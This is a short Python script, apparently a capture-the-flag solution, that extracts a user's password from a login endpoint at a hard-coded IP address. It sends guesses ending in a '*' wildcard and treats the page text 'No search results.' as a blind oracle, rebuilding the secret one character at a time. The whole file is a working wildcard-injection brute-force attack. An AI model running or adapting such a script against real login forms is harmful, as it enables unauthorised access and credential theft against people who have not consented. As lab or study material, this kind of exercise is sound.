import requests


# brute force the password
# Define the target URL
url = "http://64.227.32.21:30496/login"
# Define the payload
payload = {'username': 'reese', 'password': 'something'}
result = ""

# Define the characters to brute force, all alphanumeric characters in an array
list = ['0','1','2','3','4','5','6','7','8','9','{','}','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z', '_']

flag = 1
while flag == 1:
    flag = 0
    for i in list:
        payload['password'] = result + i + '*'
        r = requests.post(url, data=payload)
        if ("No search results." in r.text):
            result += i
            flag = 1
            print(result)
            break

print("The password is: " + result)
